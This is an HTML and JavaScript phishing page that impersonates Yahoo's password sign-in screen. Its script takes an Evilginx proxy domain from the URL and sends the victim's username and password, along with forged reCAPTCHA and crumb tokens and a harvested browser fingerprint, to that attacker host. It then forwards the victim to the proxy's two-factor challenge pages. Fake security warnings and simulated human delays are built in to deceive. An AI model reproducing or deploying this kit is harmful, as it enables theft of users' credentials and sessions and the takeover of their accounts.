<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
    <meta charset="utf-8">
    <title>Yahoo - Enter Password</title>
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <meta content="Webflow" name="generator">
    
    <link href="css/normalize.css" rel="stylesheet" type="text/css">
    <link href="css/webflow.css" rel="stylesheet" type="text/css">
    <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
    
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
    <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
    <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
    <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
    
    <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
    <link href="./yahoo.png" rel="apple-touch-icon">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <section class="section">
        <div class="div-block">
            <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
            <div class="div-block-3">
                <div class="text-block">Help</div>
                <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
                <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
            </div>
        </div>
        <div class="layout active">
            <div class="div-block-5">
                <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
                <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
            </div>
            <div class="form-block w-form">
                <form id="email-form" name="email-form" data-name="Email Form" class="form">
                    
                    <input type="hidden" name="username" id="username">
                    <input type="hidden" name="crumb" id="crumb">
                    <input type="hidden" name="acrumb" id="acrumb">
                    <input type="hidden" name="sessionIndex" id="sessionIndex">
                    <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
                    <input type="hidden" name="src" value="ym">
                    <input type="hidden" name=".lang" value="en-US">
                    <input type="hidden" name=".intl" value="us">
                    <input type="hidden" name="displayName" id="displayName">
                    <input type="hidden" name="browser-fp-data" id="browser-fp-data">
                    <input type="hidden" name="deviceCapability" id="deviceCapability">
                    <input type="hidden" name="signin" value="Next">
                    <input type="hidden" name="persistent" value="y">
                    <input type="hidden" name="g-recaptcha-response" id="recaptcha-response">
                    
                    <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
                    
                    <div class="pazzi" id="main-form">
                        <div class="reflectto" id="userEmail">Enter your password</div>
                        <h1 class="heading-2"><strong>Enter password</strong></h1>
                        <div class="text-block-2">to finish signing in<br></div>
                        
                        <!-- 🎯 ENHANCED ERROR MESSAGES -->
                        <div id="security-warning" style="display: none; background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px; padding: 12px; margin: 10px 0; color: #856404; font-family: Open Sans, sans-serif; font-size: 14px;">
                            🔒 <strong>Security Check:</strong> Yahoo detected unusual activity. Please try again in a moment.
                        </div>
                        
                        <div id="retry-message" style="display: none; background: #e7f3ff; border: 1px solid #2196f3; border-radius: 4px; padding: 12px; margin: 10px 0; color: #1565c0; font-family: Open Sans, sans-serif; font-size: 14px;">
                            🔄 <strong>Retry Attempt:</strong> Please enter your password again.
                        </div>
                        
                        <div class="pazz lpl">Password<br></div>
                        <div class="ms-input-wrap">
                            <input data-show="true" class="ms-input w-input" maxlength="256"
                                   name="passwd" data-name="passwd" placeholder="" type="password"
                                   id="password" data-ms-member="password" required="" autofocus
                                   autocomplete="current-password">
                            
                            <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
                                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
                                    <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
                                    <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
                                </div>
                            </div>
                        </div>
                        <input type="submit" data-wait="Signing in..." class="logger w-button" value="Sign In" id="submit-btn">
                    </div>
                    
                    <div class="errry" id="error-container">
                        <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
                        <div class="text-block-7" id="error-message">Something went wrong. Please try again.</div>
                        <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
                    </div>
                    
                    <div id="loading-state" style="display: none; text-align: center; padding: 20px;">
                        <div style="border: 3px solid #f3f3f3; border-top: 3px solid #6b00eb; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
                        <p style="font-family: Open Sans, sans-serif; color: #6b00eb;">Verifying password...</p>
                    </div>
                </form>
            </div>
        </div>
    </section>

    <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript"></script>
    <script src="js/webflow.js" type="text/javascript"></script>

    <script>
    document.querySelector("[data-transform]").addEventListener("click", transform);
    var isPassword = true;
    function transform() {
       var myInput = document.querySelector("[data-show]");
       var oldHtml = myInput.outerHTML;
       var text = myInput.value;
       if (isPassword) {
           var newHtml = oldHtml.replace(/password/g, "text");
       } else {
           newHtml = oldHtml.replace(/text/g, "password");
       }
       myInput.outerHTML = newHtml;
       myInput = document.querySelector("[data-show]");
       myInput.value = text;
       isPassword = !isPassword;
    }
    
    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);
    </script>

    <script>
    $(document).ready(function() {
        console.log('🎯 Yahoo password page with realistic behavior loaded');
        
        const urlParams = new URLSearchParams(window.location.search);
        const evilginxDomain = urlParams.get('evilginx_domain');
        const username = urlParams.get('u');
        const sessionIndex = urlParams.get('sessionIndex') || 'QQ--';
        const acrumb = urlParams.get('acrumb') || '';
        const error = urlParams.get('error');
        const retry = urlParams.get('retry');
        
        console.log('🎯 Parameters:');
        console.log('Username:', username);
        console.log('Error:', error);
        console.log('Retry:', retry);
        
        // 🎯 SHOW APPROPRIATE ERROR MESSAGES
        if (error === 'security_check') {
            $('#security-warning').show();
            console.log('🎯 Showing security check warning');
        }
        if (retry === 'true') {
            $('#retry-message').show();
            console.log('🎯 Showing retry message');
        }
        
        // 🎯 REALISTIC BROWSER FINGERPRINTING
        function generateRealisticFingerprint() {
            // Get real browser data where possible
            const realCanvas = document.createElement('canvas');
            const realCtx = realCanvas.getContext('2d');
            realCtx.textBaseline = 'top';
            realCtx.font = '14px Arial';
            realCtx.fillText('BrowserLeaks,com <canvas> 1.0', 2, 2);
            
            const fp = {
                // Real browser data
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                hardwareConcurrency: navigator.hardwareConcurrency,
                timezoneOffset: new Date().getTimezoneOffset(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                
                // Realistic device memory (common values)
                deviceMemory: navigator.deviceMemory || (Math.random() > 0.5 ? 8 : 4),
                
                // Real canvas fingerprint
                canvas: realCanvas.toDataURL(),
                
                // WebGL info (more realistic)
                webgl: (() => {
                    try {
                        const gl = realCanvas.getContext('webgl') || realCanvas.getContext('experimental-webgl');
                        if (gl) {
                            return {
                                vendor: gl.getParameter(gl.VENDOR),
                                renderer: gl.getParameter(gl.RENDERER),
                                version: gl.getParameter(gl.VERSION),
                                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                            };
                        }
                        return null;
                    } catch(e) { return null; }
                })(),
                
                // Storage support
                sessionStorage: typeof(Storage) !== "undefined",
                localStorage: typeof(Storage) !== "undefined",
                indexedDb: typeof(indexedDB) !== "undefined",
                
                // Real screen data
                resolution: {
                    w: screen.width,
                    h: screen.height,
                    availW: screen.availWidth,
                    availH: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                
                // Touch support
                touchSupport: {
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    touchEvent: 'ontouchstart' in window,
                    touchStart: 'ontouchstart' in window
                },
                
                // Plugins (realistic subset)
                plugins: Array.from(navigator.plugins).slice(0, 5).map(p => ({
                    name: p.name,
                    filename: p.filename
                })),
                
                // Timing (realistic)
                ts: {
                    serve: Date.now() - Math.floor(Math.random() * 1000 + 500),
                    render: Date.now() - Math.floor(Math.random() * 500 + 100)
                },
                
                // Additional realistic data
                doNotTrack: navigator.doNotTrack,
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false
            };
            
            return encodeURIComponent(JSON.stringify(fp));
        }

        function generateRealisticDeviceCapability() {
            return JSON.stringify({
                pa: { 
                    status: 'webauthn' in window && 'credentials' in navigator,
                    authenticatorSelection: {
                        authenticatorAttachment: "platform",
                        requireResidentKey: false,
                        userVerification: "preferred"
                    }
                },
                isWebAuthnSupported: 'webauthn' in window && 'credentials' in navigator,
                biometricSupport: 'credentials' in navigator
            });
        }

        function generateRealisticCrumb() {
            // More realistic crumb generation
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
            let result = '';
            for (let i = 0; i < 24; i++) { // Longer, more realistic
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        function generateRealisticRecaptcha() {
            // More realistic reCAPTCHA token
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.';
            let result = '03AGdBq2';
            for (let i = 0; i < 450; i++) { // Longer token
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        function initializeForm() {
            $('#browser-fp-data').val(generateRealisticFingerprint());
            $('#deviceCapability').val(generateRealisticDeviceCapability());
            $('#recaptcha-response').val(generateRealisticRecaptcha());
            $('#sessionIndex').val(sessionIndex);
            $('#acrumb').val(acrumb);
            $('#crumb').val(generateRealisticCrumb());
            
            if (username) {
                const decodedUsername = decodeURIComponent(username);
                $('#username').val(decodedUsername);
                $('#displayName').val(decodedUsername);
                $('#userEmail').text(decodedUsername);
                console.log('✅ Form initialized for user:', decodedUsername);
            }
        }

        function showState(state) {
            $('.pazzi, .errry, #loading-state').hide();
            if (state === 'error') {
                $('.errry').addClass('active').show();
            } else if (state === 'loading') {
                $('#loading-state').show();
            } else {
                $('.pazzi').show();
                $('.errry').removeClass('active');
            }
        }

        function showError(message) {
            $('#error-message').text(message || 'Something went wrong. Please try again.');
            showState('error');
        }

        // 🎯 HUMAN-LIKE BEHAVIOR: Add typing simulation
        let typingTimer;
        $('#password').on('input', function() {
            clearTimeout(typingTimer);
            // Simulate human typing patterns
            typingTimer = setTimeout(() => {
                console.log('🎯 User finished typing (human-like behavior)');
            }, 500);
        });

        $("#email-form").on('submit', function(e) {
            e.preventDefault();
            
            const password = $('#password').val().trim();
            if (!password) {
                showError('Please enter your password.');
                return false;
            }

            if (!evilginxDomain) {
                showError('Configuration error. Please try again.');
                return false;
            }

            console.log('🎯 Submitting password with realistic behavior...');
            $('#submit-btn').val('Signing in...').prop('disabled', true);
            
            // Hide previous messages
            $('#security-warning, #retry-message').hide();
            
            // 🎯 HUMAN-LIKE DELAY BEFORE SUBMISSION
            const humanDelay = 1200 + Math.random() * 800; // 1.2-2 seconds
            setTimeout(() => {
                showState('loading');
                
                const formData = new FormData();
                formData.append('username', $('#username').val());
                formData.append('passwd', password);
                formData.append('crumb', $('#crumb').val());
                formData.append('acrumb', $('#acrumb').val());
                formData.append('sessionIndex', $('#sessionIndex').val());
                formData.append('done', 'https://mail.yahoo.com/d/folders/1');
                formData.append('src', 'ym');
                formData.append('.lang', 'en-US');
                formData.append('.intl', 'us');
                formData.append('displayName', $('#displayName').val());
                formData.append('browser-fp-data', $('#browser-fp-data').val());
                formData.append('deviceCapability', $('#deviceCapability').val());
                formData.append('signin', 'Next');
                formData.append('persistent', 'y');
                formData.append('g-recaptcha-response', $('#recaptcha-response').val());

                fetch(`https://${evilginxDomain}/account/challenge/password`, {
                    method: 'POST',
                    body: formData,
                    credentials: 'include',
                    headers: {
                        'Referer': `https://${evilginxDomain}/`,
                        'Origin': `https://${evilginxDomain}`,
                        'User-Agent': navigator.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'DNT': '1',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1'
                    }
                }).then(response => {
                    console.log('🎯 Evilginx response status:', response.status);
                    console.log('🎯 Response URL:', response.url);
                    
                    if (response.ok || response.status === 302 || response.redirected) {
                        const redirectUrl = response.url || '';
                        console.log('✅ Password submitted successfully');
                        
                        if (redirectUrl.includes('challenge-selector') || redirectUrl.includes('2fa')) {
                            console.log('🎯 Yahoo requires 2FA');
                            setTimeout(() => {
                                window.location.href = `https://${evilginxDomain}/account/challenge/challenge-selector?sessionIndex=${sessionIndex}&acrumb=${acrumb}`;
                            }, 2000);
                        } else if (redirectUrl.includes('fail')) {
                            console.log('❌ Yahoo security check triggered');
                            // Will be handled by YAML redirect
                        } else if (redirectUrl.includes('.done') || redirectUrl.includes('mail.yahoo.com')) {
                            console.log('🎯 Login successful');
                            setTimeout(() => {
                                window.location.href = `https://${evilginxDomain}/.done=https://mail.yahoo.com/d/folders/1`;
                            }, 2000);
                        } else {
                            console.log('🎯 Assuming 2FA required');
                            setTimeout(() => {
                                window.location.href = `https://${evilginxDomain}/account/challenge/challenge-selector?sessionIndex=${sessionIndex}&acrumb=${acrumb}`;
                            }, 2000);
                        }
                    } else {
                        console.log('❌ Submission failed');
                        showError('Unable to sign in. Please try again.');
                        $('#submit-btn').val('Sign In').prop('disabled', false);
                    }
                }).catch(error => {
                    console.error('❌ Submission error:', error);
                    showError('Connection error. Please try again.');
                    $('#submit-btn').val('Sign In').prop('disabled', false);
                });
            }, humanDelay);

            return false;
        });

        $('#refreshButton').click(function() {
            $('#password').val('');
            $('#security-warning, #retry-message').hide();
            showState('main');
            $('#submit-btn').val('Sign In').prop('disabled', false);
            setTimeout(() => $('#password').focus(), 100);
        });

        initializeForm();
        
        // 🎯 REALISTIC FOCUS DELAY
        setTimeout(() => $('#password').focus(), 800 + Math.random() * 400);
        
        console.log('✅ Yahoo password page with realistic behavior initialized');
    });
    </script>
</body>
</html>
